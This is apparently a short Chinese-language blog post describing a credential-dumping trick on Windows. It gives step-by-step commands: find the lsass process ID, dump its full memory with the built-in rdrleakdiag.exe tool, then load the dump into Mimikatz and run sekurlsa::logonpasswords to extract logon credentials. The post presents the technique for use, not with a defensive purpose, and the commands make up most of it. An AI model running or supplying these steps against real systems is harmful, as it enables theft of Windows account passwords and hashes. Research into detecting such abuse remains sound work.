---
layout: post
title: "使用 rdrleakdiag.exe 转储进程"
tags: [Process_Dump, Tricks]
comments: true
---

# rdrleakdiag.exe

---

最近在 Twitter 看到有安全研究员公示了一个用于进程转储的工具，且在 Windows 的多版本中属于系统自带的程序，如果目标不存在此程序，也可以上传执行，程序本身的目的是用于资源泄露诊断，但是现在可以利用它转储指定的进程，推主贴出了用于进程转储的参数；

![](https://xxxeyj.github.io/images/20-09-15_ONE.PNG)

在 Windows 10 操作系统共发现了四个  "rdrleakdiag.exe" 程序；

在这里我们以 " C:\\Windows\System32" 目录下的 "rdrleakdiag.exe" 用作测试，首先使用 cmd 命令查找 lsass 进程的 pid；

```cmd
tasklist /svc | findstr lsass
```

![](https://xxxeyj.github.io/images/20-09-15_TWO.PNG)

可以看到 lsass 的进程 pid 为 548；

使用如下命令转储进程；
```cmd
rdrleakdiag.exe /p 548 /o C:\Users\Administrator\Desktop\ /fullmemdmp /wait 1
```
![](https://xxxeyj.github.io/images/20-09-15_THREE.PNG)

可以看到桌面上已经生成了两个文件，将其 dmp 拷贝至 Mimikatz 目录下，而后使用 Mimikatz 载入 dmp 文件，使用如下两条命令即可；
```mimikatz
sekurlsa::minidump minidump_548.dmp
sekurlsa::logonpasswords
```
![](https://xxxeyj.github.io/images/20-09-15_FOUR.PNG)

## Reference

---

https://twitter.com/0gtweet/status/1299071304805560321
